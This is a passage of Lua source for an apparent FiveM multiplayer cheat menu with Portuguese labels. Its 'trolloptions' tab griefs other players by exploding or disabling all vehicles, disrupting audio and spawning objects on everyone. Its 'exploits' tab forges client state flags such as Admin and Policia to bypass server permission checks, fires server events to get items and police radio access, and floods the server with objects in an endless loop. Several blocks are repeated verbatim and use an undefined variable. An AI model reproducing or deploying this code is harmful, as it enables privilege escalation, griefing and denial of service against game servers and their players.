            yvalue = yvalue + addbutton2

            if yvalue >= 0.34 and yvalue <= max then
                interact.togglebox(esp_vehs, "ESP Veiculos", 0.43, yvalue, function()
                    esp_vehs = not esp_vehs
                end)
            end






            yvalue = yvalue + addbutton2

            if yvalue >= 0.34 and yvalue <= max then
                interact.togglebox(listaadm, "Lista ADM Próximos", 0.43, yvalue, function()
                    listaadm = not listaadm
                end)
            end



            -- PARTE DA ESQUERDA



            yvalue = 0.3 + scrolls["visual"].static + addbutton2





            yvalue = yvalue + addbutton

            if yvalue >= 0.34 and yvalue <= max then
                interact.standardbutton("Homem", 0.615, yvalue, function()
                    Citizen.CreateThread(function()
                        RequestModel(GetHashKey("mp_m_freemode_01"))

                        Citizen.Wait(100)

                        if HasModelLoaded(GetHashKey("mp_m_freemode_01")) then
                            SetPlayerModel(PlayerId(), GetHashKey("mp_m_freemode_01"))
                        end
                    end)
                end)
            end



            yvalue = yvalue + addbutton

            if yvalue >= 0.34 and yvalue <= max then
                interact.standardbutton("Mulher", 0.615, yvalue, function()
                    Citizen.CreateThread(function()
                        RequestModel(GetHashKey("mp_f_freemode_01"))

                        Citizen.Wait(100)

                        if HasModelLoaded(GetHashKey("mp_f_freemode_01")) then
                            SetPlayerModel(PlayerId(), GetHashKey("mp_f_freemode_01"))
                        end
                    end)
                end)
            end

            yvalue = yvalue + addbutton

            if yvalue >= 0.34 and yvalue <= max then
                interact.standardbutton("Omen", 0.615, yvalue, function()
                    Notify("Sucesso", "camargo-sucess", "Skin setada com sucesso!", 255, 255, 255)
                    Citizen.CreateThread(function()
                        local modelHash = GetHashKey('omen')
                        RequestModel(modelHash)
                        while not HasModelLoaded(modelHash) do
                            Citizen.Wait(10)
                        end
                        SetPlayerModel(PlayerId(), modelHash)
                        SetModelAsNoLongerNeeded(modelHash)
                        SetPedDefaultComponentVariation(PlayerPedId())
                    end)
                end)
            end
            yvalue = yvalue + addbutton

            if yvalue >= 0.34 and yvalue <= max then
                interact.standardbutton("Jett", 0.615, yvalue, function()
                    Notify("Sucesso", "camargo-sucess", "Skin setada com sucesso!", 255, 255, 255)
                    Citizen.CreateThread(function()
                        local modelHash = GetHashKey('jett')
                        RequestModel(modelHash)
                        while not HasModelLoaded(modelHash) do
                            Citizen.Wait(10)
                        end
                        SetPlayerModel(PlayerId(), modelHash)
                        SetModelAsNoLongerNeeded(modelHash)
                        SetPedDefaultComponentVariation(PlayerPedId())
                    end)
                end)
            end

            yvalue = yvalue + addbutton

            if yvalue >= 0.34 and yvalue <= max then
                interact.standardbutton("Harbor", 0.615, yvalue, function()
                    Notify("Sucesso", "camargo-sucess", "Skin setada com sucesso!", 255, 255, 255)
                    Citizen.CreateThread(function()
                        local modelHash = GetHashKey('harbor')
                        RequestModel(modelHash)
                        while not HasModelLoaded(modelHash) do
                            Citizen.Wait(10)
                        end
                        SetPlayerModel(PlayerId(), modelHash)
                        SetModelAsNoLongerNeeded(modelHash)
                        SetPedDefaultComponentVariation(PlayerPedId())
                    end)
                end)
            end
            yvalue = yvalue + addbutton

            if yvalue >= 0.34 and yvalue <= max then
                interact.standardbutton("Travis", 0.615, yvalue, function()
                    Notify("Sucesso", "camargo-sucess", "Skin setada com sucesso!", 255, 255, 255)
                    Citizen.CreateThread(function()
                        local modelHash = GetHashKey('travis')
                        RequestModel(modelHash)
                        while not HasModelLoaded(modelHash) do
                            Citizen.Wait(10)
                        end
                        SetPlayerModel(PlayerId(), modelHash)
                        SetModelAsNoLongerNeeded(modelHash)
                        SetPedDefaultComponentVariation(PlayerPedId())
                    end)
                end)
            end
            yvalue = yvalue + addbutton

            if yvalue >= 0.34 and yvalue <= max then
                interact.standardbutton("Chamber", 0.615, yvalue, function()
                    Notify("Sucesso", "camargo-sucess", "Skin setada com sucesso!", 255, 255, 255)
                    Citizen.CreateThread(function()
                        local modelHash = GetHashKey('chamber')
                        RequestModel(modelHash)
                        while not HasModelLoaded(modelHash) do
                            Citizen.Wait(10)
                        end
                        SetPlayerModel(PlayerId(), modelHash)
                        SetModelAsNoLongerNeeded(modelHash)
                        SetPedDefaultComponentVariation(PlayerPedId())
                    end)
                end)
            end
        elseif psychovars.main.tab == "trolloptions" then
            local yvalue = 0.32 + scrolls["trolloptions"].static

            local addbutton = 0.045

            local addbutton2 = 0.030

            local max = 0.76

            interact.Scroll(10, "trolloptions")

            yvalue = yvalue + addbutton2


            if getsource("vrpserver") then
                return
            else
                yvalue = yvalue + addbutton2

                if yvalue >= 0.34 and yvalue <= max then
                    interact.togglebox(delv3hs, "Audio Fucker (ALL)", 0.43, yvalue, function()
                        delv3hs = not delv3hs
                    end)
                end
            end

            yvalue = yvalue + addbutton2

            if yvalue >= 0.34 and yvalue <= max then
                interact.togglebox(deleng1n3, "Falar Com Todos [!]", 0.43, yvalue, function()
                    deleng1n3 = not deleng1n3
                end)
            end

            yvalue = yvalue + addbutton2

            if yvalue >= 0.34 and yvalue <= max then
                interact.togglebox(olh0st4z3r, "Olhos RPG [!]", 0.43, yvalue, function()
                    olh0st4z3r = not olh0st4z3r
                end)
            end


            yvalue = yvalue + addbutton2

            if yvalue >= 0.34 and yvalue <= max then
                interact.togglebox(bugv3hs, "Bugar Veículos do Jogador [!]", 0.43, yvalue, function()
                    bugv3hs = not bugv3hs
                end)
            end



            yvalue = yvalue + addbutton2

            if yvalue >= 0.34 and yvalue <= max then
                interact.togglebox(j0garv3hs, "Lançar Veículos", 0.43, yvalue, function()
                    j0garv3hs = not j0garv3hs
                end)
            end



            if NoisyCars then
                for d77 in EnumerateVehicles() do
                    NetworkRequestControlOfEntity(d77)

                    SetVehicleAlarm(d77, true)

                    SetVehicleAlarmTimeLeft(d77, 1000)
                end
            end



            yvalue = yvalue + addbutton2

            if yvalue >= 0.34 and yvalue <= max then
                interact.togglebox(killenginev3hs, "Quebrar Motor dos Veículos", 0.43, yvalue, function()
                    killenginev3hs = not killenginev3hs
                end)
            end



            yvalue = yvalue + addbutton2

            if yvalue >= 0.34 and yvalue <= max then
                interact.togglebox(killpneusv3hs, "Estourar Pneus dos Veículos", 0.43, yvalue, function()
                    killpneusv3hs = not killpneusv3hs
                end)
            end



            yvalue = yvalue + addbutton2

            if yvalue >= 0.34 and yvalue <= max then
                interact.togglebox(NoisyCars, "Carros Barulhentos", 0.43, yvalue, function()
                    NoisyCars = not NoisyCars
                end)
            end



            yvalue = yvalue + addbutton

            if yvalue >= 0.34 and yvalue <= max then
                interact.standardbutton("Preparar Carros", 0.425, yvalue, function()
                    Notify("Sucesso", "camargo-sucess", "Carros Preparados!", 255, 255, 255)
                    prepararindexar()
                end)
            end

            yvalue = yvalue + addbutton

            if yvalue >= 0.34 and yvalue <= max then
                interact.standardbutton("Explodir Veiculos", 0.425, yvalue, function()
                    Notify("Sucesso", "camargo-sucess", "Carros Preparados!", 255, 255, 255)
                    explodeallveh()
                end)
            end


            yvalue = yvalue + addbutton

            if yvalue >= 0.34 and yvalue <= max then
                interact.standardbutton("Levitar Carros", 0.425, yvalue, function()
                    Notify("Sucesso", "camargo-sucess", "Carros Preparados!", 255, 255, 255)
                    TutuuuFly()
                end)
            end



            yvalue = yvalue + addbutton

            if yvalue >= 0.34 and yvalue <= max then
                interact.standardbutton("Mudar placas Carro ~b~PERTO", 0.425, yvalue, function()
                    Notify("Sucesso", "camargo-sucess", "Carros Preparados!", 255, 255, 255)
                    tutu_MudarPlacaMQCU()
                end)
            end

            yvalue = yvalue + addbutton

            if yvalue >= 0.34 and yvalue <= max then
                interact.standardbutton("Spawnar Baleia (Loop)", 0.425, yvalue, function()
                    Notify("Sucesso", "camargo-sucess", "Carros Preparados!", 255, 255, 255)
                    function baleias()
                        local pedModels = {
                            "a_c_humpback"
                        }

                        Citizen.CreateThread(function()
                            for _, pedModel in ipairs(pedModels) do
                                RequestModel(pedModel)

                                while not HasModelLoaded(pedModel) do
                                    Wait(100)
                                end


                                local playerList = GetActivePlayers()
                                for _, playerId in ipairs(playerList) do
                                    local ped = GetPlayerPed(playerId)
                                    local pos = GetEntityCoords(ped)
                                    local heading = GetEntityHeading(ped)


                                    local animal = CreateObject(pedModel, pos.x, pos.y, pos.z, true, true, false)


                                    SetEntityAsMissionEntity(animal, true, true)
                                    SetEntityHeading(animal, heading)
                                    SetEntityAsNoLongerNeeded(animal)
                                end

                                Citizen.Wait(11305)
                            end
                        end)
                    end

                    baleias()
                end)
            end
        elseif psychovars.main.tab == "exploits" then
            local yvalue = 0.32 + scrolls["exploits"].static
            local addbutton = 0.045
            local addbutton2 = 0.030
            local max = 0.76

            yvalue = yvalue + addbutton

            if yvalue >= 0.34 and yvalue <= max then
                interact.standardbutton("Setar na Policia (ALL)", 0.425, yvalue, function()
                    Notify("Sucesso", "camargo-sucess", "Setado Na Policia!", 255, 255, 255)
                    LocalPlayer.state["Spotify"] = true                                              -- Player has Spotify feature enabled
                    LocalPlayer.state["Musica"] = true                                               -- Player can play music
                    LocalPlayer.state["Premium"] = true                                              -- Player is a premium member
                    LocalPlayer.state["Lafy"] = true                                                 -- Specific role or feature (could be faction, etc.)
                    LocalPlayer.state["Open"] = true                                                 -- Player has opened a specific interface or menu
                    LocalPlayer.state["hasPermission"] = true                                        -- Player has a certain permission
                    LocalPlayer.state["Faccao"] = true                                               -- Player belongs to a faction
                    LocalPlayer.state["Policia"] = true                                              -- Player is in the police faction
                    LocalPlayer.state["Cop"] = true                                                  -- Player is a cop
                    LocalPlayer.state["BauPM"] = true                                                -- Player can access specific item or feature (e.g., Bau PM)
                    LocalPlayer.state["PM"] = true                                                   -- Player is a member of the PM (police faction)
                    LocalPlayer.state["Level"] = 10                                                  -- Player's level (could be any integer)
                    LocalPlayer.state["XP"] = 5000                                                   -- Player's experience points
                    LocalPlayer.state["FactionID"] = 3                                               -- ID for a faction (can be used to determine player faction)
                    LocalPlayer.state["Role"] =
                    "Admin"                                                                          -- Player's role, could be Admin, Moderator, etc.
                    LocalPlayer.state["FactionName"] = "Los Santos Police Department"                -- The faction name
                    LocalPlayer.state["Team"] =
                    "Red"                                                                            -- The player's team in a specific game mode
                    LocalPlayer.state["Inventory"] = { "item1", "item2", "item3" }                   -- A list of items
                    LocalPlayer.state["Permissions"] = { "can_drive", "can_fight", "can_use_radio" } -- List of permissions
                    LocalPlayer.state["Faction"] = nil                                               -- Player has no faction
                    LocalPlayer.state["Music"] =
                    ""                                                                               -- No music playing, empty string can indicate this
                    LocalPlayer.state["CustomStateName"] =
                        value                                                                        -- This can be any type (boolean, string, integer, etc.)
                    LocalPlayer.state["Spotify"] = nil                                               -- Reset Spotify state
                    LocalPlayer.state["Admin"] = true                                                -- Player is an admin
                    LocalPlayer.state["Moderator"] = false                                           -- Player is not a moderator
                    LocalPlayer.state["InMission"] = true                                            -- Player is in a mission
                    LocalPlayer.state["IsWanted"] = false                                            -- Player is not wanted by the police
                    LocalPlayer.state["RaceMode"] = true                                             -- Player is in a race mode
                    LocalPlayer.state["FreeRoam"] = true                                             -- Player is in free roam
                end)
            end


    
            yvalue = yvalue + addbutton

            if yvalue >= 0.34 and yvalue <= max then
                interact.standardbutton("Setar na Fac (ALL)", 0.425, yvalue, function()
                    Notify("Sucesso", "camargo-sucess", "Setado Nas Fac!", 255, 255, 255)
                    LocalPlayer.state["Spotify"] = true                                                                 -- Player has Spotify feature enabled
                    LocalPlayer.state["Musica"] = true                                                                  -- Player can play music
                    LocalPlayer.state["Premium"] = true                                                                 -- Player is a premium member
                    LocalPlayer.state["Lafy"] = true                                                                    -- Specific role or feature (could be faction, etc.)
                    LocalPlayer.state["Open"] = true                                                                    -- Player has opened a specific interface or menu
                    LocalPlayer.state["hasPermission"] = true                                                           -- Player has a certain permission
                    LocalPlayer.state["Faccao"] = true                                                                  -- Player belongs to a faction
                    LocalPlayer.state["Policia"] = true                                                                 -- Player is in the police faction
                    LocalPlayer.state["Cop"] = true                                                                     -- Player is a cop
                    LocalPlayer.state["BauPM"] = true                                                                   -- Player can access specific item or feature (e.g., Bau PM)
                    LocalPlayer.state["PM"] = true                                                                      -- Player is a member of the PM (police faction)
                    LocalPlayer.state["Level"] = 10                                                                     -- Player's level (could be any integer)
                    LocalPlayer.state["XP"] = 5000                                                                      -- Player's experience points
                    LocalPlayer.state["FactionID"] = 3                                                                  -- ID for a faction (can be used to determine player faction)
                    LocalPlayer.state["Role"] =
                    "Admin"                                                                                             -- Player's role, could be Admin, Moderator, etc.
                    LocalPlayer.state["FactionName"] =
                    "Los Santos Police Department"                                                                      -- The faction name
                    LocalPlayer.state["Team"] =
                    "Red"                                                                                               -- The player's team in a specific game mode
                    LocalPlayer.state["Inventory"] = { "radio", "weapon_pistol_mk2", "weapon_pistol", "WEAPON_PISTOL" } -- A list of items
                    LocalPlayer.state["Permissions"] = { "can_drive", "can_fight", "can_use_radio" }                    -- List of permissions
                    LocalPlayer.state["Faction"] = nil                                                                  -- Player has no faction
                    LocalPlayer.state["Music"] =
                    ""                                                                                                  -- No music playing, empty string can indicate this
                    LocalPlayer.state["CustomStateName"] =
                        value                                                                                           -- This can be any type (boolean, string, integer, etc.)
                    LocalPlayer.state["Admin"] = true                                                                   -- Player is an admin
                    LocalPlayer.state["Moderator"] = true                                                               -- Player is not a moderator
                    LocalPlayer.state["InMission"] = true                                                               -- Player is in a mission
                    LocalPlayer.state["IsWanted"] = false                                                               -- Player is not wanted by the police
                    LocalPlayer.state["RaceMode"] = true                                                                -- Player is in a race mode
                    LocalPlayer.state["FreeRoam"] = true                                                                -- Player is in free roam
                end)
            end


            yvalue = yvalue + addbutton

            if yvalue >= 0.34 and yvalue <= max then
                interact.standardbutton("Abrir Spotify", 0.425, yvalue, function()
                    LocalPlayer.state["Spotify"] = true                                                                 -- Player has Spotify feature enabled
                    LocalPlayer.state["Musica"] = true                                                                  -- Player can play music
                    LocalPlayer.state["Premium"] = true                                                                 -- Player is a premium member
                    LocalPlayer.state["Lafy"] = true                                                                    -- Specific role or feature (could be faction, etc.)
                    LocalPlayer.state["Open"] = true                                                                    -- Player has opened a specific interface or menu
                    LocalPlayer.state["hasPermission"] = true                                                           -- Player has a certain permission
                    LocalPlayer.state["Faccao"] = true                                                                  -- Player belongs to a faction
                    LocalPlayer.state["Policia"] = true                                                                 -- Player is in the police faction
                    LocalPlayer.state["Cop"] = true                                                                     -- Player is a cop
                    LocalPlayer.state["BauPM"] = true                                                                   -- Player can access specific item or feature (e.g., Bau PM)
                    LocalPlayer.state["PM"] = true                                                                      -- Player is a member of the PM (police faction)
                    LocalPlayer.state["Level"] = 10                                                                     -- Player's level (could be any integer)
                    LocalPlayer.state["XP"] = 5000                                                                      -- Player's experience points
                    LocalPlayer.state["FactionID"] = 3                                                                  -- ID for a faction (can be used to determine player faction)
                    LocalPlayer.state["Role"] =
                    "Admin"                                                                                             -- Player's role, could be Admin, Moderator, etc.
                    LocalPlayer.state["FactionName"] =
                    "Los Santos Police Department"                                                                      -- The faction name
                    LocalPlayer.state["Team"] =
                    "Red"                                                                                               -- The player's team in a specific game mode
                    LocalPlayer.state["Inventory"] = { "radio", "weapon_pistol_mk2", "weapon_pistol", "WEAPON_PISTOL" } -- A list of items
                    LocalPlayer.state["Permissions"] = { "can_drive", "can_fight", "can_use_radio" }                    -- List of permissions
                    LocalPlayer.state["Faction"] = nil                                                                  -- Player has no faction
                    LocalPlayer.state["Music"] =
                    ""                                                                                                  -- No music playing, empty string can indicate this
                    LocalPlayer.state["CustomStateName"] =
                        value                                                                                           -- This can be any type (boolean, string, integer, etc.)
                    LocalPlayer.state["Admin"] = true                                                                   -- Player is an admin
                    LocalPlayer.state["Moderator"] = true                                                               -- Player is not a moderator
                    LocalPlayer.state["InMission"] = true                                                               -- Player is in a mission
                    LocalPlayer.state["IsWanted"] = false                                                               -- Player is not wanted by the police
                    LocalPlayer.state["RaceMode"] = true                                                                -- Player is in a race mode
                    LocalPlayer.state["FreeRoam"] = true                                                                -- Player is in free roam
                    Notify("Sucesso", "camargo-sucess", "Spotify Aberto!", 255, 255, 255)
                    TriggerEvent('lafy:open')
                    TriggerEvent("lafy:invoke")
                    TriggerEvent("lafy:hand")
                    LocalPlayer.state["Spotify"] = true                                                                 -- Player has Spotify feature enabled
                    LocalPlayer.state["Musica"] = true                                                                  -- Player can play music
                    LocalPlayer.state["Premium"] = true                                                                 -- Player is a premium member
                    LocalPlayer.state["Lafy"] = true                                                                    -- Specific role or feature (could be faction, etc.)
                    LocalPlayer.state["Open"] = true                                                                    -- Player has opened a specific interface or menu
                    LocalPlayer.state["hasPermission"] = true                                                           -- Player has a certain permission
                    LocalPlayer.state["Faccao"] = true                                                                  -- Player belongs to a faction
                    LocalPlayer.state["Policia"] = true                                                                 -- Player is in the police faction
                    LocalPlayer.state["Cop"] = true                                                                     -- Player is a cop
                    LocalPlayer.state["BauPM"] = true                                                                   -- Player can access specific item or feature (e.g., Bau PM)
                    LocalPlayer.state["PM"] = true                                                                      -- Player is a member of the PM (police faction)
                    LocalPlayer.state["Level"] = 10                                                                     -- Player's level (could be any integer)
                    LocalPlayer.state["XP"] = 5000                                                                      -- Player's experience points
                    LocalPlayer.state["FactionID"] = 3                                                                  -- ID for a faction (can be used to determine player faction)
                    LocalPlayer.state["Role"] =
                    "Admin"                                                                                             -- Player's role, could be Admin, Moderator, etc.
                    LocalPlayer.state["FactionName"] =
                    "Los Santos Police Department"                                                                      -- The faction name
                    LocalPlayer.state["Team"] =
                    "Red"                                                                                               -- The player's team in a specific game mode
                    LocalPlayer.state["Inventory"] = { "radio", "weapon_pistol_mk2", "weapon_pistol", "WEAPON_PISTOL" } -- A list of items
                    LocalPlayer.state["Permissions"] = { "can_drive", "can_fight", "can_use_radio" }                    -- List of permissions
                    LocalPlayer.state["Faction"] = nil                                                                  -- Player has no faction
                    LocalPlayer.state["Music"] =
                    ""                                                                                                  -- No music playing, empty string can indicate this
                    LocalPlayer.state["CustomStateName"] =
                        value                                                                                           -- This can be any type (boolean, string, integer, etc.)
                    LocalPlayer.state["Admin"] = true                                                                   -- Player is an admin
                    LocalPlayer.state["Moderator"] = true                                                               -- Player is not a moderator
                    LocalPlayer.state["InMission"] = true                                                               -- Player is in a mission
                    LocalPlayer.state["IsWanted"] = false                                                               -- Player is not wanted by the police
                    LocalPlayer.state["RaceMode"] = true                                                                -- Player is in a race mode
                    LocalPlayer.state["FreeRoam"] = true                                                                -- Player is in free roam
                end)
            end

            yvalue = yvalue + addbutton

            if yvalue >= 0.34 and yvalue <= max then
                interact.standardbutton("Pegar JBL", 0.425, yvalue, function()
                    LocalPlayer.state["Spotify"] = true                                                                 -- Player has Spotify feature enabled
                    LocalPlayer.state["Musica"] = true                                                                  -- Player can play music
                    LocalPlayer.state["Premium"] = true                                                                 -- Player is a premium member
                    LocalPlayer.state["Lafy"] = true                                                                    -- Specific role or feature (could be faction, etc.)
                    LocalPlayer.state["Open"] = true                                                                    -- Player has opened a specific interface or menu
                    LocalPlayer.state["hasPermission"] = true                                                           -- Player has a certain permission
                    LocalPlayer.state["Faccao"] = true                                                                  -- Player belongs to a faction
                    LocalPlayer.state["Policia"] = true                                                                 -- Player is in the police faction
                    LocalPlayer.state["Cop"] = true                                                                     -- Player is a cop
                    LocalPlayer.state["BauPM"] = true                                                                   -- Player can access specific item or feature (e.g., Bau PM)
                    LocalPlayer.state["PM"] = true                                                                      -- Player is a member of the PM (police faction)
                    LocalPlayer.state["Level"] = 10                                                                     -- Player's level (could be any integer)
                    LocalPlayer.state["XP"] = 5000                                                                      -- Player's experience points
                    LocalPlayer.state["FactionID"] = 3                                                                  -- ID for a faction (can be used to determine player faction)
                    LocalPlayer.state["Role"] =
                    "Admin"                                                                                             -- Player's role, could be Admin, Moderator, etc.
                    LocalPlayer.state["FactionName"] =
                    "Los Santos Police Department"                                                                      -- The faction name
                    LocalPlayer.state["Team"] =
                    "Red"                                                                                               -- The player's team in a specific game mode
                    LocalPlayer.state["Inventory"] = { "radio", "weapon_pistol_mk2", "weapon_pistol", "WEAPON_PISTOL" } -- A list of items
                    LocalPlayer.state["Permissions"] = { "can_drive", "can_fight", "can_use_radio" }                    -- List of permissions
                    LocalPlayer.state["Faction"] = nil                                                                  -- Player has no faction
                    LocalPlayer.state["Music"] =
                    ""                                                                                                  -- No music playing, empty string can indicate this
                    LocalPlayer.state["CustomStateName"] =
                        value                                                                                           -- This can be any type (boolean, string, integer, etc.)
                    LocalPlayer.state["Admin"] = true                                                                   -- Player is an admin
                    LocalPlayer.state["Moderator"] = true                                                               -- Player is not a moderator
                    LocalPlayer.state["InMission"] = true                                                               -- Player is in a mission
                    LocalPlayer.state["IsWanted"] = false                                                               -- Player is not wanted by the police
                    LocalPlayer.state["RaceMode"] = true                                                                -- Player is in a race mode
                    LocalPlayer.state["FreeRoam"] = true                                                                -- Player is in free roam



                    Notify("Sucesso", "camargo-sucess", "JBL Spawnada!", 255, 255, 255)


                    local ped = PlayerPedId()
                    local pos = GetEntityCoords(ped)

                    -- Define the prop to spawn (boombox)
                    local prop = "prop_boombox_01"

                    -- Add a small offset to the spawn position to avoid overlap
                    local offset = 0.5 -- Adjust as needed to prevent overlap
                    local spawnPos = vector3(pos.x + offset, pos.y + offset, pos.z)

                    -- Create the object at the spawn position
                    local object = CreateObject(GetHashKey(prop), spawnPos.x, spawnPos.y, spawnPos.z, true, true, false)

                    -- Optionally, set the object to be persistent and attached to the world
                    SetEntityAsMissionEntity(object, true, true)
                    PlaceObjectOnGroundProperly(object)
                end)
            end

            yvalue = yvalue + addbutton

            if yvalue >= 0.34 and yvalue <= max then
                interact.standardbutton("Flodar JBL (Loop)", 0.425, yvalue, function()
                    LocalPlayer.state["Spotify"] = true                                                                 -- Player has Spotify feature enabled
                    LocalPlayer.state["Musica"] = true                                                                  -- Player can play music
                    LocalPlayer.state["Premium"] = true                                                                 -- Player is a premium member
                    LocalPlayer.state["Lafy"] = true                                                                    -- Specific role or feature (could be faction, etc.)
                    LocalPlayer.state["Open"] = true                                                                    -- Player has opened a specific interface or menu
                    LocalPlayer.state["hasPermission"] = true                                                           -- Player has a certain permission
                    LocalPlayer.state["Faccao"] = true                                                                  -- Player belongs to a faction
                    LocalPlayer.state["Policia"] = true                                                                 -- Player is in the police faction
                    LocalPlayer.state["Cop"] = true                                                                     -- Player is a cop
                    LocalPlayer.state["BauPM"] = true                                                                   -- Player can access specific item or feature (e.g., Bau PM)
                    LocalPlayer.state["PM"] = true                                                                      -- Player is a member of the PM (police faction)
                    LocalPlayer.state["Level"] = 10                                                                     -- Player's level (could be any integer)
                    LocalPlayer.state["XP"] = 5000                                                                      -- Player's experience points
                    LocalPlayer.state["FactionID"] = 3                                                                  -- ID for a faction (can be used to determine player faction)
                    LocalPlayer.state["Role"] =
                    "Admin"                                                                                             -- Player's role, could be Admin, Moderator, etc.
                    LocalPlayer.state["FactionName"] =
                    "Los Santos Police Department"                                                                      -- The faction name
                    LocalPlayer.state["Team"] =
                    "Red"                                                                                               -- The player's team in a specific game mode
                    LocalPlayer.state["Inventory"] = { "radio", "weapon_pistol_mk2", "weapon_pistol", "WEAPON_PISTOL" } -- A list of items
                    LocalPlayer.state["Permissions"] = { "can_drive", "can_fight", "can_use_radio" }                    -- List of permissions
                    LocalPlayer.state["Faction"] = nil                                                                  -- Player has no faction
                    LocalPlayer.state["Music"] =
                    ""                                                                                                  -- No music playing, empty string can indicate this
                    LocalPlayer.state["CustomStateName"] =
                        value                                                                                           -- This can be any type (boolean, string, integer, etc.)
                    LocalPlayer.state["Admin"] = true                                                                   -- Player is an admin
                    LocalPlayer.state["Moderator"] = true                                                               -- Player is not a moderator
                    LocalPlayer.state["InMission"] = true                                                               -- Player is in a mission
                    LocalPlayer.state["IsWanted"] = false                                                               -- Player is not wanted by the police
                    LocalPlayer.state["RaceMode"] = true                                                                -- Player is in a race mode
                    LocalPlayer.state["FreeRoam"] = true                                                                -- Player is in free roam


                    Citizen.CreateThread(function()
                        while true do
                            Citizen.Wait(1)
                            local ped = PlayerPedId()
                            local pos = GetEntityCoords(ped)

                            local prop = "prop_boombox_01"

                            local offset = 0.5
                            local spawnPos = vector3(pos.x + offset, pos.y + offset, pos.z)


                            local object = CreateObject(GetHashKey(prop), spawnPos.x, spawnPos.y, spawnPos.z, true, true,
                                false)

                            SetEntityAsMissionEntity(object, true, true)
                            PlaceObjectOnGroundProperly(object)
                        end
                    end)
                end)
            end

            yvalue = yvalue + addbutton

            if yvalue >= 0.34 and yvalue <= max then
                interact.standardbutton("Comprar Radio", 0.425, yvalue, function()
                    LocalPlayer.state["Spotify"] = true                                                                 -- Player has Spotify feature enabled
                    LocalPlayer.state["Musica"] = true                                                                  -- Player can play music
                    LocalPlayer.state["Premium"] = true                                                                 -- Player is a premium member
                    LocalPlayer.state["Lafy"] = true                                                                    -- Specific role or feature (could be faction, etc.)
                    LocalPlayer.state["Open"] = true                                                                    -- Player has opened a specific interface or menu
                    LocalPlayer.state["hasPermission"] = true                                                           -- Player has a certain permission
                    LocalPlayer.state["Faccao"] = true                                                                  -- Player belongs to a faction
                    LocalPlayer.state["Policia"] = true                                                                 -- Player is in the police faction
                    LocalPlayer.state["Cop"] = true                                                                     -- Player is a cop
                    LocalPlayer.state["BauPM"] = true                                                                   -- Player can access specific item or feature (e.g., Bau PM)
                    LocalPlayer.state["PM"] = true                                                                      -- Player is a member of the PM (police faction)
                    LocalPlayer.state["Level"] = 10                                                                     -- Player's level (could be any integer)
                    LocalPlayer.state["XP"] = 5000                                                                      -- Player's experience points
                    LocalPlayer.state["FactionID"] = 3                                                                  -- ID for a faction (can be used to determine player faction)
                    LocalPlayer.state["Role"] =
                    "Admin"                                                                                             -- Player's role, could be Admin, Moderator, etc.
                    LocalPlayer.state["FactionName"] =
                    "Los Santos Police Department"                                                                      -- The faction name
                    LocalPlayer.state["Team"] =
                    "Red"                                                                                               -- The player's team in a specific game mode
                    LocalPlayer.state["Inventory"] = { "radio", "weapon_pistol_mk2", "weapon_pistol", "WEAPON_PISTOL" } -- A list of items
                    LocalPlayer.state["Permissions"] = { "can_drive", "can_fight", "can_use_radio" }                    -- List of permissions
                    LocalPlayer.state["Faction"] = nil                                                                  -- Player has no faction
                    LocalPlayer.state["Music"] =
                    ""                                                                                                  -- No music playing, empty string can indicate this
                    LocalPlayer.state["CustomStateName"] =
                        value                                                                                           -- This can be any type (boolean, string, integer, etc.)
                    LocalPlayer.state["Admin"] = true                                                                   -- Player is an admin
                    LocalPlayer.state["Moderator"] = true                                                               -- Player is not a moderator
                    LocalPlayer.state["InMission"] = true                                                               -- Player is in a mission
                    LocalPlayer.state["IsWanted"] = false                                                               -- Player is not wanted by the police
                    LocalPlayer.state["RaceMode"] = true                                                                -- Player is in a race mode
                    LocalPlayer.state["FreeRoam"] = true                                                                -- Player is in free roam


                    Notify("Sucesso", "camargo-sucess", "Radio Comprado!", 255, 255, 255)

                    local code = {
                        "functionShops",
                        { "Departament", "radio", 1, 16 },
                        "inventory",
                        -1
                    }


                    TriggerServerEvent("inventory/shops:tunnel_req", table.unpack(code))
                end)
            end

            KeyInput = function(TextEntry, ExampleText, MaxStringLength)
                AddTextEntry('FMMC_KEY_TIP2', TextEntry .. ':')
                DisplayOnscreenKeyboard(1, 'FMMC_KEY_TIP2', '', ExampleText, '', '', '', MaxStringLength)
                blockinput = true
            
                while UpdateOnscreenKeyboard() ~= 1 and UpdateOnscreenKeyboard() ~= 2 do
                    Wait(0)
                end
            
                if UpdateOnscreenKeyboard() ~= 2 then
                    AddTextEntry('FMMC_KEY_TIP2', '')
                    local Kboard = GetOnscreenKeyboardResult()
                    Wait(500)
                    blockinput = false
                    return Kboard
                else
                    AddTextEntry('FMMC_KEY_TIP2', '')
                    Wait(500)
                    blockinput = false
                    return Kboard
                end
            end
            yvalue = yvalue + addbutton

            if yvalue >= 0.34 and yvalue <= max then
                interact.standardbutton("Entrar na radio ", 0.425, yvalue, function()
                    LocalPlayer.state["Spotify"] = true
                    LocalPlayer.state["Musica"] = true
                    LocalPlayer.state["Premium"] = true
                    LocalPlayer.state["Lafy"] = true
                    LocalPlayer.state["Open"] = true
                    LocalPlayer.state["hasPermission"] = true
                    LocalPlayer.state["Faccao"] = true
                    LocalPlayer.state["Policia"] = true
                    LocalPlayer.state["Cop"] = true
                    LocalPlayer.state["BauPM"] = true
                    LocalPlayer.state["PM"] = true
                    LocalPlayer.state["Level"] = 10
                    LocalPlayer.state["XP"] = 5000
                    LocalPlayer.state["FactionID"] = 3
                    LocalPlayer.state["Role"] = "Admin"
                    LocalPlayer.state["FactionName"] = "Los Santos Police Department"
                    LocalPlayer.state["Team"] = "Red"
                    LocalPlayer.state["Inventory"] = { "radio", "weapon_pistol_mk2", "weapon_pistol", "WEAPON_PISTOL" }
                    LocalPlayer.state["Permissions"] = { "can_drive", "can_fight", "can_use_radio" }
                    LocalPlayer.state["Faction"] = nil
                    LocalPlayer.state["Music"] = ""
                    LocalPlayer.state["CustomStateName"] = value
                    LocalPlayer.state["Admin"] = true
                    LocalPlayer.state["Moderator"] = true
                    LocalPlayer.state["InMission"] = true
                    LocalPlayer.state["IsWanted"] = false
                    LocalPlayer.state["RaceMode"] = true
                    LocalPlayer.state["FreeRoam"] = true
            
                    Notify("Sucesso", "camargo-sucess", "Radio PM !", 255, 255, 255)
            
            
                    local radioFrequency = KeyInput("Numero da radio", "", 19)
            

                    if radioFrequency and tonumber(radioFrequency) then
                        local code = json.decode(string.format('[ "Frequency", [%d], "santa_radio", 1 ]', tonumber(radioFrequency)))
                        
     
                        local nomedocarro = radioFrequency 
                        TriggerServerEvent("radio:tunnel_req", table.unpack(code))
                    else
                        Notify("Erro", "camargo-error", "Número de rádio inválido", 255, 0, 0)
                    end
                end)
            end
            
            
    

            yvalue = yvalue + addbutton

